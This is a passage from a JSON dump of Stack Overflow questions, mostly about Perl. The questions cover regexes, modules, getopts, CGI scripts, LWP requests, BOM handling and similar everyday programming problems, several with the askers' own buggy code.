advance.</p>\n\n<p><strong>Edit:</strong> I was asked what I am doing. It is a script, part of our cross-platform build system. The script recurses directories and figures out what files to build. Some files are platform-specific, and thus, on Linux I don't want to build the files ending with _win.cpp, etc.</p>\n"},{"tags":["perl","variables","interpolate"],"answer_count":8,"favorite_count":2,"up_vote_count":3,"down_vote_count":2,"view_count":5717,"score":1,"question_id":209095,"title":"How do I interpolate variables to call a Perl function from a module?","body":"<p>Requirement is to pass module name and function name from the command-line argument.\nI need to get the command-line argument in the program and I need to call that function from that module</p>\n\n<p>For example, calling a try.pl program with 2 arguments: MODULE1(Module name) Display(Function name)</p>\n\n<pre><code> perl try.pl MODULE1 Display\n</code></pre>\n\n<p>I want to some thing like this, but its not working, please guide me: </p>\n\n<pre><code>use $ARGV[0];\n&amp; $ARGV[0]::$ARGV[1]();\n</code></pre>\n"},{"tags":["perl","search"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":222,"score":-1,"question_id":208919,"title":"How do I search text then print the result?","body":"<p>I am searching for \"o\" then prints all lines with \"o\". Any suggestion/code I must apply?</p>\n\n<p>data.txt:</p>\n\n<pre><code>j,o,b:\na,b,d:\no,l,e:\nf,a,r:\ne,x,o:\n</code></pre>\n\n<p>desired output:</p>\n\n<pre><code>j,o,b:\no,l,e:\ne,x,o:\n</code></pre>\n"},{"tags":["perl","file","comparison"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12447298,"title":"How to detect UTF8 with BOM encoding in Perl","body":"<p>I have simple Perl script that does comparison of two files.\nResult I write in different files with UTF8 BOM encoding.\nTo save text in BOM file I do printing chr(65279) into the beginning of the result file. Sometimes input text already contains BOM char in the begging of the text and my script prints one more.</p>\n\n<p><strong>The question is:</strong> How I can workaround it to do not print this BOM char twice.</p>\n\n<p>See below text of my Perl's code:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse List::Compare;\nuse Cwd 'abs_path';\nuse open ':encoding(utf8)';\nuse open IO =&gt; ':encoding(utf8)';\n\nopen F, \"&lt;$ARGV[0]\" or die $!;\nopen S, \"&lt;$ARGV[1]\" or die $!;\nmy @a=&lt;F&gt;;\nmy @b=&lt;S&gt;;\nclose F;\nclose S;\n\nmy $lc = List::Compare-&gt;new(\\@a, \\@b);\n\nmy @intersection = $lc-&gt;get_intersection;\nmy @missing = $lc-&gt;get_unique;\nmy @extra = $lc-&gt;get_complement;\n\nopen EXTRA, \"&gt;\".$ARGV[2].\"file_extra.txt\" or die(\"Unable to open the file\");\nopen MISSING, \"&gt;\".$ARGV[2].\"file_missing.txt\" or die(\"Unable to open the file\");\nopen SUBTRACTED, \"&gt;\".$ARGV[2].\"file_subtr.txt\" or die(\"Unable to open the file\");\n\n#Turn on UTF-8 BOM support\nprint EXTRA chr(65279);\nprint MISSING chr(65279);\nprint SUBTRACTED chr(65279);\n\nprint MISSING @missing;\nprint EXTRA @extra;\nprint SUBTRACTED @intersection;\n\nclose MISSING;\nclose EXTRA;\nclose SUBTRACTED;\n</code></pre>\n"},{"tags":["perl","perl-data-structures","perl-oo"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12435648,"title":"What is the difference in memory usage and reference counting in \"has-a\" and \"is-a\" relationship in Perl?","body":"<p>I read the \"Programming Perl\" book which is rather complicated in some places. And one of those places is the section \"Instance Destructors\" in the 12-th chapter \"Objects\". This section says:</p>\n\n<ol>\n<li>Objects in Perl are destroyed when there is no more references to them.</li>\n<li>There is an opportunity to capture control just before object is going to be recycled by defining <code>DESTROY</code> method in its class.</li>\n<li>Although destructors are rarely needed in Perl, some objects may have, for instance, filehandles or database connections, which are outside of the memory system. So it is necessary to attend them specially.</li>\n<li>Perl does not do hierarchical destruction.</li>\n</ol>\n\n<p>Then there is a paragraph which I failed to understand:</p>\n\n<blockquote>\n  <p><strong>This only applies to inherited classes;</strong> an object that is simply contained within\n  the current objectâas, for example, one value in a larger hashâwill be freed\n  and destroyed automatically. This is one reason why containership via mere ag-\n  gregation (sometimes called a âhas-aâ relationship) is often cleaner and clearer\n  than inheritance (an âis-aâ relationship).</p>\n</blockquote>\n\n<p>I can't understand what it means. Does it mean that <em>an object that</em> <strong>IS NOT</strong> <em>simply contained within the current object,</em> <strong>WILL NOT</strong> <em>be freed and destroyed automatically</em>?</p>\n\n<p>I do know that a <code>DESTROY</code> that is called on the garbage collection is the nearest one and only one. No other overridden <code>DESTROY</code> methods are called when there is no refs to an instance. But, as I understand, the same behavior is expected when a ref to an instance is placed inside another object.</p>\n\n<p>Would someone be so pleasant to construe and to <strong>provide a code-example</strong> ? </p>\n\n<hr>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>Actually what I was looking for, was the explanation of the <strong>This only applies to inherited classes;</strong> words which turned out to be that:</p>\n\n<p><em>If you have an instance of a class and it has a <code>DESTROY</code> method than that method will override <code>DESTROY</code> methods of a parent class(es), but that does not apply to an object, that is in a <code>has-a</code> relationship with the object in question. Its <code>DESTROY</code> won't be overridden</em></p>\n\n<p>Sorry for not clear question, it would better fit to the English Language and Usage. Thanks to everyone.</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":89,"score":4,"question_id":12445046,"title":"Perl: Why my regex is not matching","body":"<p>I am trying to extract a part of a string using regex. I have the following cases for string:</p>\n\n<pre><code>case1: Warehouse.13.season01episode01.hdtv.xor.avi\ncase2: Warehouse.13.s01e01.hdtv.xor.avi\ncase3: Warehouse.13.01x01.hdtv.xor.avi\n</code></pre>\n\n<p>The <code>delimter(.)</code> in the above string can be replaced by <code>\\s - _</code>. </p>\n\n<p>The logic am using is check if <code>s or season</code> is precided(lookbehind) by number and \nextract everything before it but as look-behind need absolute length I reversed the string\nand used look ahead on it.</p>\n\n<p>Now for case1 I created the below regex which works fine and outputs <code>Warehouse.13</code>.</p>\n\n<pre><code>.*?\\d{1,2}e\\d{1,2}s\\.(?=\\d+)(.*)\n</code></pre>\n\n<p>Now for case2 I used:</p>\n\n<pre><code>.*?\\d{1,2}edosipe\\d{1,2}nosaes\\.(?=\\d+)(.*) # works fine.\n</code></pre>\n\n<p>Now when I try to combine the above two cases + optional delimiter like:</p>\n\n<pre><code>.*?\\d{1,2}[e|edosipe]?[._ x\\-]?\\d{1,2}[s|nosaes]?[._\\- ]?(?=\\d+)(.*)\n</code></pre>\n\n<p>In the above case you can observe that most of the things are optinal(?). It is for the \ncase3.</p>\n\n<p>Using the above regex doesn't match anything for case2 but works fine for case1 and case3.</p>\n\n<p>Any idea what is wrong here.</p>\n\n<p>PS: I am aware there might be other possible string which will defy the above regex but \ncurrently am not interested in them.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12402949,"title":"create a hash from command line in perl","body":"<p>I have a file with data like below:</p>\n\n<pre><code>4  1\n7  12\n2  5\n4  4\n6  67\n12  5\n</code></pre>\n\n<p>through command line i can split each and every line  into an array like below:</p>\n\n<pre><code>perl -F'\\s+' -ane 'print $F[0]' file\n</code></pre>\n\n<p>thus will print all the first fields.\nNow the above command transforms every line into an array.\nin a similar way can this be done line creating a hash with keys as the first field and values for each key is the second field.?</p>\n"},{"tags":["perl","line-breaks"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12442940,"title":"Ignore linebreaks in Strings","body":"<p>Is it possible to tell Perl to ignore linebreaks in Strings? </p>\n\n<p>I need linebreaks for formatting reasons as I have very long strings.</p>\n\n<p>E.g.</p>\n\n<pre><code>print \"hello \nworld\"\n</code></pre>\n\n<p>shall give</p>\n\n<pre><code>hello world\n</code></pre>\n\n<p>and not</p>\n\n<pre><code>hello\nworld\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":12443549,"title":"IO::All: how do I read from ARGV and DATA?","body":"<p>How do I create an <a href=\"http://search.cpan.org/perldoc?IO%3A%3AAll\" rel=\"nofollow\">IO::All</a> object to read the file handles ARGV and DATA?  </p>\n\n<pre><code>use strict;\nuse warnings;\nuse 5.010_000;\nuse IO::All;\n\n# none of these work...\nmy $io = io-&gt;handle(DATA);\nmy $io = io-&gt;handle(\\*DATA);\nmy $f = \\*DATA;\nmy $io = io-&gt;handle($f);\nmy $io = io-&gt;handle({$f});\nmy $io = io-&gt;handle({DATA});\nmy $io = io-&gt;handle({\\*DATA});\n\nsay $io-&gt;slurp();\n\n__DATA__\nFOO\nBAR\nQUUX\n</code></pre>\n"},{"tags":["regex","perl","variables"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12442623,"title":"Regex to match perl variable","body":"<p>I'm currently learning about regular expressions and I'm trying to create a regex to match any legal variable name in Perl.</p>\n\n<p><strong>This is what I wrote so far:</strong></p>\n\n<pre><code>^\\$[A-Za-z_][a-zA-Z0-9_]*\n</code></pre>\n\n<p>The only problem is the regex returns true for special signs, for example the string <strong><em>$a&amp;</em></strong> will return true.</p>\n\n<p>What I did wrong?</p>\n\n<p>Thanks!\nRotem</p>\n"},{"tags":["perl","hash","module"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":72,"score":1,"question_id":12438148,"title":"Getting hash from module in to the main Perl code","body":"<p>This is the first time, I am working with module. I am trying to retrieve the content of a hash present in the module into main perl code.</p>\n\n<p>Below is the module DRUG.pm</p>\n\n<pre><code>package DRUG;\nrequire Exporter;\n\nour @ISA = qw(Exporter);\nour @EXPORT = qw(%DRUG);\n\n%DRUG = (\n    'warfarin ' =&gt; 1,\n    'midazolam ' =&gt; 1,\n    'acebutolol ' =&gt; 1,\n);\n</code></pre>\n\n<p>Here is the main program, trying to access hash present in the module</p>\n\n<pre><code>use warnings;\nuse strict;\nuse DRUG;\n\nforeach my $nme (keys %DRUG){\nprint \"$nme\\n\";\n}\n</code></pre>\n\n<p>I am unable to get hash information from module and could not print that hash in the main perl code.</p>\n\n<p>Can some one help me in this?</p>\n\n<p>THanks</p>\n"},{"tags":["perl","logging","daemon","file-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12416799,"title":"Should I turn a perl script that parses a /var/log/.* file into a daemon?","body":"<p>I am writing a perl script to parse, for example, <code>/var/log/syslog</code>.</p>\n\n<p>The perl script triggers further subsequent tasks when particular events in the log appear. The log is parsed following the advice of this post:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/10801034/command-line-monitor-log-file-and-add-data-to-database\">Command line: monitor log file and add data to database</a></p>\n\n<p>Which what I believe is the use of a pipe.</p>\n\n<p>Now I'd like this script to forever run in the background.</p>\n\n<p>This sounds like a daemon to me, and the daemon program referenced in the following question seems ideal:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/766397/how-can-i-run-a-perl-script-as-a-system-daemon-in-linux\">How can I run a Perl script as a system daemon in linux?</a> </p>\n\n<p>But from this post, it seems clear that daemon's have no open file handles. So how can I have a daemon, or a perl script that becomes a daemon, that monitors a logfile?</p>\n"},{"tags":["php","perl","debugging","xdebug"],"answer_count":3,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":99,"score":4,"question_id":12309413,"title":"Is there a tool out there that allows debugging of PHP applications line by line? Like how it's done in perl or .net?","body":"<p>Is there an equivalent of 'perl -d' for PHP? I need to step through some complicated unit test and don't want to install any firefox or client/server extensions. Just looking for a line by line execution of my code.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12440334,"title":"Perl operator meaning :: and ->","body":"<p>I am new to Perl and I am wondering what :: and -> mean and if they mean the same or are different? I mostly saw them on variable/method calls on objects? Thanks for any hint!</p>\n"},{"tags":["regex","perl","parsing"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":2,"view_count":139,"score":1,"question_id":181136,"title":"Search then Extract","body":"<p>I have a text file with multiple records. I want to search a name and date, for example if I typed <code>JULIUS CESAR</code> as name then the whole data about <code>JULIUS</code> will be extracted. What if I want only to extract information?</p>\n\n<pre><code>Record number: 1\nDate: 08-Oct-08\nTime: 23:45:01\nName: JULIUS CESAR\nAddress: BAGUIO CITY, Philippines\nInformation:\nI lived in Peza Loakan, Bagiou City\nA Computer Engineering student\nAn OJT at TIPI.\n23 years old.\n\nRecord number: 2\nDate: 09-Oct-08\nTime: 23:45:01\nName: JOHN Castro\nAddress: BAGUIO CITY, Philippines\nInformation:\nI lived in Peza Loakan, Bagiou City\nA Electronics Comm. Engineering Student at SLU.\nAn OJT at TIPI.\nMy Hobby is Programming.\n\n\nRecord number: 3\nDate: 08-Oct-08\nTime: 23:45:01\nName: CESAR JOSE\nAddress: BAGUIO CITY, Philippines\nInformation:\nHi,,\nI lived Manila City\nA Computer Engineering student\nWorking at TIPI.\n</code></pre>\n"},{"tags":["string","perl","input"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12326589,"title":"Comparing Input to Strings","body":"<p>So I'm writing a relatively simple program that prompts the user for a command, add, subtract, etc, and then prompt for numbers to complete that operation.  Everything is written and it compiles fine, but when I enter a command in (add, subtract, etc.) it isn't comparing it properly.  Instead of entering the operation branch of the if case, it goes to the invalid command catch I added.  Here is part of the code that contains the declaration and the first if statement.</p>\n\n<pre><code>my $command = &lt;STDIN&gt;;\nmy $counter = 1;\n#perform the add operation if the command is add\nif (($command eq 'add') || ($command eq 'a')){\n\n    my $numIn = 0;\n    my $currentNum = 0;\n    #While NONE is not entered, input numbers.\n    while ($numIn ne 'NONE'){\n        if($counter == 1){\n            print \"\\nEnter the first number: \";\n        }else{\n            print \"\\nEnter the next number or NONE to be finished.\";\n        }\n        $numIn = &lt;STDIN&gt;;\n        $currentNum = $currentNum + $numIn;\n\n        $counter++;\n    }\n\n    print \"\\nThe answer is: #currentNum \\n\";\n\n#perform the subtract operation if the command is subtract\n}`\n</code></pre>\n\n<p>Does anyone know why if I enter in add it skips this?</p>\n"},{"tags":["perl","ubuntu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":119,"score":0,"question_id":12436587,"title":"How to run perl script from any where (any directory)","body":"<p>I have a perl script exist in the follwoing path (/home/Leen/Desktop/Tools/bin/tool.pl)\nEvery time I want to run this tool I go to the terminal </p>\n\n<pre><code>&gt;\n</code></pre>\n\n<p>and then change the directory to </p>\n\n<p>..../bin></p>\n\n<p>Then I run the perl by writing </p>\n\n<pre><code>..../bin&gt; perl tool.pl file= whatever config= whatever\n</code></pre>\n\n<p>The problem is that I want to run this perl script without the need to go to the bin folder where it exist . so I can run perl script from any directory and as soon as I enter shell\nI went to the etc/environment and I wrote the follwoing</p>\n\n<p>export PERL5LIB=$PERL5LIB:/home/Leen/Desktop/Tools/bin</p>\n\n<p>But when I go to terminal and write the follwoing straight ahead without going to bin folder where tool.pl exist </p>\n\n<pre><code>&gt;perl tool.pl file=... config=...\n</code></pre>\n\n<p>it says the file \"tool.pl\" does not exist???</p>\n"},{"tags":["perl","function"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":57,"score":-2,"question_id":12437340,"title":"Function on perl doesn't work","body":"<p>I have a function:</p>\n\n<pre><code>my $descr = 'Rand [Hi|Hello|Aloha] [Kate|Ann|Polly]';\nprint intrp($descr);\n\nsub intrp($str)\n{\n\nmy $str =~ s{\n    \\[ ( [^\\]]* ) \\]\n}{\n    my @choices = split /\\|/, $1;\n    $choices[rand(@choices)]\n}xeg;\n\nreturn $str;\n}\n</code></pre>\n\n<p>Why it doesn't work?=\\ I tried some other methods, but they didn't help me</p>\n"},{"tags":["string","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":77,"score":0,"question_id":12436643,"title":"Randing a string","body":"<pre><code>$str = '[Hi|Hello|Aloha] [Kate|Ann|Polly]';\n</code></pre>\n\n<p>I need a function that will print me a random variation of the str. For example:</p>\n\n<pre><code>Hi Ann\nHello Polly\n....\n....\n</code></pre>\n\n<p>Anny ideas?</p>\n"},{"tags":["perl","integration","jira","accurev","event-triggers"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12431505,"title":"Accurev Triggers for Security, Stream Management and JIRA Integration","body":"<p>About 6 months ago we started using AccuRev with JIRA for our source control and issue management, but there are some obvious problems, like a lack of security, everyone can pretty much do anything, like lock and unlock stream and change streams belonging to anyone else and on top of it the default email trigger that ships with Accurev is not very good.</p>\n\n<p>Accurev allows for pre-create, pre-keep, pre-promote and server-post-promote phase and I've decide to use those to help me manage some of the wild west of Accurev development. I'll stick with PERL since that is what they used for the original trigger and will post mine here later, but before I start, I was wondering if someone maybe already had this problem before, how did you solve it and if you could post some of your triggers here or ideas for triggers and what can be managed through them, it would be greatly appreciated.</p>\n"},{"tags":["regex","perl","shell","path","glob"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12435559,"title":"How to check in perl if path is a sub directory or a file from a list of base paths (who have globed paths)","body":"<p>I need an optimum way to match a path with huge list of probable basepaths (which may be many directory levels up). The base paths themselves may be valid shell globbed paths </p>\n\n<p>E.g.</p>\n\n<p>I need to match the path <strong>/a/b-12/c/d/e/fg/hi/94.txt</strong> in the list below:</p>\n\n<ol>\n<li>/a/b-*/e </li>\n<li>/x/y* </li>\n<li>/x/{a,b,s*}e </li>\n<li>/a/{a,b*,c}2/c/d </li>\n<li>/a/b*/c/e </li>\n<li>...</li>\n</ol>\n\n<p>The list is long with 10Ks of such paths. Once we have identified the probable parent paths I can verify them by chdir/cd to the path etc. </p>\n\n<p>I wish to a regex match on the list but shell globbed paths are difficult for me to match. Are there Perl modules which can help me in this.</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","debugging","emacs"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":12426942,"title":"Perl debugger on Emacs: Clear screen (buffer)?","body":"<p>Say I have long debugging session in Perl with <code>perldb</code> on Emacs (M-x perldb). The output piles up, and at some point it becomes difficult to navigate through it.</p>\n\n<p>I can restart the debugger with <kbd>R</kbd>, but that doesn't clear up the previous output. Is there a command to clear up the output of the buffer of the Perl debugger without having to kill the debugger and starting a new session?</p>\n"},{"tags":["perl","permutation","uninitialized"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12434239,"title":"In trying to write a script to permute values in a list, I'm getting an uninitialized value warning","body":"<p>I'm very unsure what is happening. For various lengths of <code>@depths</code>, the code generally works. However, throughout the output, at certain points the program barfs up complaints about use of an uninitialized value.</p>\n\n<p>The errors blame line 20: <code>print $chars[$depths[$y]];</code></p>\n\n<p>I apologize ahead of time if it's something obvious, but I'm definitely missing the issue. I've googled for about an hour with no luck so any nudges in the right direction would be <strong>very</strong> appreciated!</p>\n\n<p>Complete code:</p>\n\n<pre><code>#! /usr/bin/perl -w\n\nuse strict;\nuse warnings;\n\n#my @chars  = (\"0\" .. \"9\");\n#my @depths = (0) x 4;\nmy @chars   = (\"0\" .. \"1\");\nmy @depths  = (0) x 3;\n\nmy ($i, $x, $y);\n\nfor ($i = 0; $i &lt; @chars ** @depths; $i++) {\n\n    for ($y = 0; $y &lt; @depths; $y++) {\n\n        print $chars[$depths[$y]];\n    }\n    print\"\\n\";\n\n    $depths[$#depths]++;\n    for($x = 0; $x &lt; @depths; $x++) {\n\n        if($depths[$x] == @chars) {\n\n            $depths[$x-1]++;\n            while($x &lt; @depths) {\n\n                $depths[$x++] = 0;\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>000\n001\n010\n011\nUse of uninitialized value in print at a.pl line 15.\n00\n100\n101\n110\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":28,"score":-2,"question_id":12434771,"title":"Why doesn't getopts('absif:', \\%Options) report an error when I pass an invalid option?","body":"<h3>file.pl</h3>\n\n<pre><code>if (! getopts('abisf:',\\%Options)){\n# Display usage details\nprint \"Usage Error invalid options \\n\";\nexit(1);\n}\n</code></pre>\n\n<p>If I run:</p>\n\n<pre><code>$&gt;perl file.pl -q @argv;\n</code></pre>\n\n<p>This should print the usage error but it doesn't.</p>\n\n<pre><code>$&gt;perl file.pl -a @argv;\n</code></pre>\n\n<p>This should have <code>$Options{a}=1</code> but what I see is <code>$Options{a}=''</code> i.e null.</p>\n\n<p>What's going on?</p>\n"},{"tags":["perl","hash","match"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":76,"score":2,"question_id":12423791,"title":"smart match operator for hash of hash","body":"<p>I want to match keys of a <strong>hash of hash</strong> with regexp .</p>\n\n<pre><code>$line=\" Cluster(A,B):A(T) M(S)\";\n$reg=\"Cluster\";\nmy ( $cluster, $characters ) = split (/:/,$line);\n$HoH{$cluster}={split /[( )]+/,$characters } ;\nforeach $value(keys %HoH){\n    foreach $characters (keys %{$HoH{$cluster}}){\n        print \"$value:$characters\\n\" if    /$reg/ ~~ %HoH;\n    }\n}\n</code></pre>\n\n<p>now Output is :</p>\n\n<p>Cluster(A,B):A</p>\n\n<p>Cluster(A,B):M</p>\n\n<p>This code is works fine with this sample data,but not with real data!! my data is more complicated but the structure is the same I was wondering if there is some other ways to do this </p>\n"},{"tags":["perl","file-handling"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":324,"score":1,"question_id":2071275,"title":"Perl: opening a file, and saving it under a different name after editing","body":"<p>I'm trying to write a configuration script.\nFor each customer, it will ask for variables, and then write several text files.</p>\n\n<p>But each text file needs to be used more than once, so it can't overwrite them.  I'd prefer it read from each file, made the changes, and then saved them to $name.originalname.</p>\n\n<p>Is this possible?</p>\n"},{"tags":["perl","http","ipv6"],"answer_count":1,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":236,"score":9,"question_id":11096442,"title":"perl support IPv6 address format [::1] in HTTP::Request","body":"<p>Debian Wheezy (perl 5.14) </p>\n\n<p><strong>Work nice:</strong></p>\n\n<pre><code>use LWP::Simple;\nprint get( 'http://ip6-localhost:80' );\n</code></pre>\n\n<p><strong>Not working</strong> (1)</p>\n\n<pre><code>use LWP::Simple;\nprint get( 'http://[::1]:80' );\n</code></pre>\n\n<p><strong>Not working</strong> (2) [Return: <strong>Bad hostname</strong>]</p>\n\n<pre><code>use LWP::Simple;\n$ua = new LWP::UserAgent();\nmy $req = new HTTP::Request(\"GET\", \"http://[::1]/\");\nmy $res = $ua-&gt;request($req);\n</code></pre>\n\n<p><strong>Not working</strong> (3) [Return: <strong>Connection refused</strong>]</p>\n\n<pre><code>use Net::INET6Glue::INET_is_INET6;\nuse LWP::Simple;\n$ua = new LWP::UserAgent();\nmy $req = new HTTP::Request(\"GET\", \"http://[::1]/\");\nmy $res = $ua-&gt;request($req);\n</code></pre>\n\n<p>Why I need it? Because ldirectord need it. :(\nAny suggestion?</p>\n"},{"tags":["perl","dns","ip","lwp","lwp-useragent"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":12433362,"title":"LWP::UserAgent set ip of requested url so LWP doesn't have to do dns lookup","body":"<p>I'm using <a href=\"http://search.cpan.org/~gaas/libwww-perl-6.04/lib/LWP/UserAgent.pm\" rel=\"nofollow\">LWP::UserAgent</a> to request a lot of page content. I already know the ip of the urls I am requesting so I'd like to be able to specify the ip address of where the url I am requesting is hosted, so that LWP does not have to spend time doing a dns lookup. I've looked through the documentation but haven't found any solutions. Does anyone know of a way to do this? Thanks!</p>\n"},{"tags":["php","perl","web-scraping"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":12313877,"title":"How to scrape ASP based sites with javascript in perl","body":"<p>I need your help in this task.\nI searched a lot and did a lot to scrape my asp sites using perl.\nBut I'm still not successful in it.</p>\n\n<p>In case, if you can help me then please give a sample code to scrape a asp sites, i want the contents of the site in the complete HTML way as they're showing in firebug.</p>\n"},{"tags":["perl","sorting"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12427374,"title":"Using the indices from sorting a list in Perl to sort and index another","body":"<p>Say I have a list that holds words and another one that holds confidences associated with those words:</p>\n\n<pre><code>my @list = (\"word1\", \"word2\", \"word3\", \"word4\");\nmy @confidences = (0.1, 0.9, 0.3, 0.6);\n</code></pre>\n\n<p>I would like to obtain a second pair of lists with the elements of <code>@list</code> whose confidences were higher than <code>0.4</code> in sorted order, and their corresponding confidences. How do I do that in Perl? (i.e. use the list of indices used for sorting another list)</p>\n\n<p>In the example above, the output would be:</p>\n\n<pre><code>my @sorted_and_thresholded_list = (\"word2\", \"word4\");\nmy @sorted_and_thresholded_confidences = (0.9, 0.6);\n</code></pre>\n\n<ul>\n<li>The entries in @list may not be unique (i.e. and sorting should be stable)</li>\n<li>Sorting should be in descending order.</li>\n</ul>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":65,"score":3,"question_id":12428846,"title":"How to use the /r flag in Perl regex?","body":"<p>The Perl doc states:</p>\n\n<pre><code>e  Evaluate 'replacement' as an expression\nr  Return substitution and leave the original string untouched.\n</code></pre>\n\n<p>are available flags to be used in replacement patterns. When I pass the <code>r</code> flag to my substitution pattern, it gets interpreted as a syntax error. I am running Perl 5.8.8. Is it possible it is not supported in my version of Perl? Also, can someone provide a working example of how to use the flag and how to call the newly created replacement?</p>\n"},{"tags":["arrays","perl","element","elements","matching"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":47,"score":1,"question_id":12432750,"title":"How do I match parts of elements from an array1 to elements in array2?","body":"<p>I have a question about matching array element parts.</p>\n\n<p>I have two arrays:</p>\n\n<p>@1 = SMITH SMIT MITH SMI MIT ITH        (parts of the surname SMITH)</p>\n\n<p>@2 = a list of 150,000 surnames</p>\n\n<p>I need to search @2 for the elements in @1 and then print the whole matching surname from @2.</p>\n\n<p>For example:</p>\n\n<p>If SMITHERS is in @2: print \"SMITHERS\"  (because SMITH, SMIT, MITH, SMI, MIT, ITH match)</p>\n\n<p>If MITCHELL is in @2: print \"MITCHELL\"   (because MIT matches)</p>\n\n<p>If SCHMITTY is in @2: print \"SCHMITTY\"   (because MIT matches)</p>\n\n<p>If JONES is in @2: blank   (Because there are no matches)</p>\n\n<p>Thanks for your help.</p>\n\n<p>Forgot to mention, I am using Perl</p>\n"},{"tags":["perl","arguments","command-line-arguments"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12432197,"title":"Passing multiple strings to one option as an argument to a Perl script","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7108429/getoptlong-getting-a-string-with-spaces-into-a-variable\">Getopt::Long getting a string with spaces into a variable</a>  </p>\n</blockquote>\n\n\n\n<p>Say I have the following Perl script:</p>\n\n<pre><code>use 5.010;\nuse strict;\nuse warnings;\nuse Getopt::Std; \nuse vars qw($opt_i $opt_o $opt_m); \n&amp;getopts('i:o:m:'); \n\nsay $opt_m\n</code></pre>\n\n<p>If I call this script with</p>\n\n<pre><code>perl script.pl -i text -o string -m hello how are you, world?\n</code></pre>\n\n<p>I don't get \"hello how are you, world?\" in <code>$opt_m</code>. How can I capture a string separated by whitespaces as one of the switch arguments to my script?</p>\n"},{"tags":["perl","apache2","cgi","httpd.conf","cgi-bin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":12418250,"title":"Can't locate Connection.pm in @INC (@INC contains: /usr/local/lib/perl/5.14.2 /etc/perl /usr/local/share/perl/5.14.2 ....) at ./select.cgi at line","body":"<p>I am trying my hands for the first time in -> <strong>Apache - Perl (CGI)</strong> on Ubuntu. </p>\n\n<p>The Apache server is working fine in the folder <code>/var/www</code> for the default <code>index.html</code> file. But since I want to run a CGI script, I also installed (just in case) DBI, as suggested by some forums. I set the permissions for complete access to my <code>cgi-bin</code> folder in which the <code>select.cgi</code> script resides. I tried tweaking the <code>select.cgi</code> script multiple times redirecting the library to the Perl library, but to no avail. I modified the <code>httpd.conf</code> file and set the directory path to the <code>select.cgi</code> folder. That didn't work. I also defined <code>ScriptAlias</code>, and set it to the working directory. That didn't work either.\nDoes anyone have any helpful pointers. Thanks.</p>\n"},{"tags":["perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12431862,"title":"Cgi script is printing the html text file rather rendering it in the browser while sourcing the module","body":"<p>I have following code</p>\n\n<pre><code>#file 1 a.pm\npackage a;\n@Export=(test);\n\nprint \"test\"; #hashing this is enabling the rendering \n\nsub test {\n  return 1;\n} \n\n#file 2 main cgi script test.pl\nuse a;\nmy $t = test();\nprint \"Content-type: text/html\\n\\n\";\nprint \"&lt;html&gt;\\n&lt;body&gt;\\n&lt;p&gt;test= $t&lt;/p&gt;&lt;/body&gt;\\n&lt;/html&gt;\";\n</code></pre>\n\n<p>While hashing the print line in module a is enabling the rendering but when print statement is enable, it is unable to do it?  